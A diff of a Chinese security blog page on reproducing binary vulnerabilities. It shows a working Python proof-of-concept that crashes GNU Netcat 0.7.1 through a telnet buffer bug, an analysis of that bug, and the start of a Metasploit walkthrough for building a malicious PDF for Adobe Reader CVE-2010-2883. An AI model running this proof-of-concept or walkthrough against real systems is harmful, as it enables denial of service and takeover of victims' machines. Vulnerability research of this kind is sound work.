@@ -73,7 +73,7 @@
 <meta property="og:image" content="http://gd.com/2019/08/15/erjinzhi/1565884116994.png">
 <meta property="og:image" content="http://gd.com/2019/08/15/erjinzhi/1565884208232.png">
 <meta property="og:image" content="http://gd.com/2019/08/15/erjinzhi/1565884394171.png">
-<meta property="og:updated_time" content="2019-09-13T16:00:29.441Z">
+<meta property="og:updated_time" content="2019-09-14T01:28:25.661Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="二进制漏洞复现">
 <meta name="twitter:description" content="二进制漏洞复现NETCAT【NC】 0.7.1 远程拒绝服务漏洞nc在使用-T参数的时候是负责处理telnet连接，当利用nc构建一个telnet的服务端的时候，如果在客户端发送特殊的数据包，nc会处理telnet数据，会导致nc在处理telnet数据的时候，由于处理buffer的时候在处理结束时没有对buffer的长度进行重置，导致连续多次写入telnet数据之后，由于向不可写的内存写入数据，最">
@@ -249,7 +249,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-09-14 00:00:29" itemprop="dateModified" datetime="2019-09-14T00:00:29+08:00">2019-09-14</time>
+                <time title="修改时间：2019-09-14 09:28:25" itemprop="dateModified" datetime="2019-09-14T09:28:25+08:00">2019-09-14</time>
               </span>
             
           
@@ -265,7 +265,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="二进制漏洞复现"><a href="#二进制漏洞复现" class="headerlink" title="二进制漏洞复现"></a>二进制漏洞复现</h1><h2 id="NETCAT【NC】-0-7-1-远程拒绝服务漏洞"><a href="#NETCAT【NC】-0-7-1-远程拒绝服务漏洞" class="headerlink" title="NETCAT【NC】 0.7.1 远程拒绝服务漏洞"></a>NETCAT【NC】 0.7.1 远程拒绝服务漏洞</h2><p>nc在使用-T参数的时候是负责处理telnet连接，当利用nc构建一个telnet的服务端的时候，如果在客户端发送特殊的数据包，nc会处理telnet数据，会导致nc在处理telnet数据的时候，由于处理buffer的时候在处理结束时没有对buffer的长度进行重置，导致连续多次写入telnet数据之后，由于向不可写的内存写入数据，最后引发拒绝服务漏洞，下面对此漏洞进行详细分析。</p>
+        <h1 id="二进制漏洞复现"><a href="#二进制漏洞复现" class="headerlink" title="二进制漏洞复现"></a>二进制漏洞复现</h1><h2 id="NETCAT【NC】-0-7-1-远程拒绝服务漏洞"><a href="#NETCAT【NC】-0-7-1-远程拒绝服务漏洞" class="headerlink" title="NETCAT【NC】 0.7.1 远程拒绝服务漏洞"></a>NETCAT【NC】 0.7.1 远程拒绝服务漏洞</h2><p>nc在使用-T参数的时候是负责处理telnet连接，当利用nc构建一个telnet的服务端的时候，如果在客户端发送特殊的数据包，nc会处理telnet数据，会导致nc在处理telnet数据的时候，由于处理buffer的时候在处理结束时没有对buffer的长度进行重置，导致连续多次写入telnet数据之后，由于向不可写的内存写入数据，最后引发拒绝服务漏洞，下面对此漏洞进行详细分析。<a id="more"></a></p>
 <p>软件下载：<a href="https://www.exploit-db.com/apps/088def25efe04dcdd1f8369d8926ab34-netcat-0.7.1.tar.gz" target="_blank" rel="noopener">https://www.exploit-db.com/apps/088def25efe04dcdd1f8369d8926ab34-netcat-0.7.1.tar.gz</a></p>
 <p>poc：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#/usr/bin/python</span><br><span class="line">#-*- Coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">RHOST = &quot;127.0.0.1&quot;</span><br><span class="line">RPORT = 1111</span><br><span class="line"></span><br><span class="line">print(&quot;[+] Connecting to %s:%d&quot;) % (RHOST, RPORT)</span><br><span class="line">s = socket.create_connection((RHOST, RPORT))</span><br><span class="line">s.send(&quot;\xFF&quot;) # Telnet control character</span><br><span class="line">print(&quot;[+] Telnet control character sent&quot;)</span><br><span class="line">print(&quot;[i] Starting&quot;)</span><br><span class="line">try:</span><br><span class="line">    i = 0</span><br><span class="line">    while True: # Loop until it crashes</span><br><span class="line">        i += 1</span><br><span class="line">        s.send(&quot;\x30&quot;)</span><br><span class="line">except:</span><br><span class="line">    print(&quot;[+] GNU Netcat crashed on iteration: %d&quot;) % (i)</span><br></pre></td></tr></table></figure>
@@ -291,7 +291,7 @@
 <h3 id="4、查看反编译的伪c代码"><a href="#4、查看反编译的伪c代码" class="headerlink" title="4、查看反编译的伪c代码"></a>4、查看反编译的伪c代码</h3><p><img src="/2019/08/15/erjinzhi/1568390233(1" alt="1568390236310">.jpg)</p>
 <p>buf，size变量指针都取决于ncsock结构体，而后面赋值时会将buf赋值给getrq_5494，而l_5494就是全局变量</p>
 <p>结束处理的时候，没有对全局变量重置，最后导致了拒绝服务的发生</p>
-<h2 id="漏洞复现-CVE-2010-2883-Adobe-Reader-打开pdf电脑即刻中招"><a href="#漏洞复现-CVE-2010-2883-Adobe-Reader-打开pdf电脑即刻中招" class="headerlink" title="[漏洞复现] CVE-2010-2883 Adobe Reader 打开pdf电脑即刻中招"></a>[漏洞复现] CVE-2010-2883 Adobe Reader 打开pdf电脑即刻中招</h2><p>CVE-2010-2883漏洞原理：“Adobe Reader在处理CoolType字体文件的sing表时，存在栈溢出漏洞，<strong>当打开特制的恶意PDF文件时，可允许任意代码远程执行</strong>。<a id="more"></a></p>
+<h2 id="漏洞复现-CVE-2010-2883-Adobe-Reader-打开pdf电脑即刻中招"><a href="#漏洞复现-CVE-2010-2883-Adobe-Reader-打开pdf电脑即刻中招" class="headerlink" title="[漏洞复现] CVE-2010-2883 Adobe Reader 打开pdf电脑即刻中招"></a>[漏洞复现] CVE-2010-2883 Adobe Reader 打开pdf电脑即刻中招</h2><p>CVE-2010-2883漏洞原理：“Adobe Reader在处理CoolType字体文件的sing表时，存在栈溢出漏洞，<strong>当打开特制的恶意PDF文件时，可允许任意代码远程执行</strong>。</p>
 <p><strong>影响版本：Adobe Reader 8.2.4 - 9.3.4</strong></p>
 <h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><h4 id="1、进入Kali-Linux，使用Metasploit生成PDF木马文件"><a href="#1、进入Kali-Linux，使用Metasploit生成PDF木马文件" class="headerlink" title="1、进入Kali Linux，使用Metasploit生成PDF木马文件"></a>1、进入Kali Linux，使用Metasploit生成PDF木马文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">搜索Adobe渗透模块  </span><br><span class="line">msf &gt; search adobe_cooltype_sing </span><br><span class="line">调用渗透模块  </span><br><span class="line">msf &gt; use exploit/windows/fileformat/adobe_cooltype_sing/ </span><br><span class="line">查看模块详情  </span><br><span class="line">msf exploit(adobe_cooltype_sing) &gt; info</span><br></pre></td></tr></table></figure>
 <p><img src="/2019/08/15/erjinzhi/1565883113002.png" alt="1565883113002"></p>
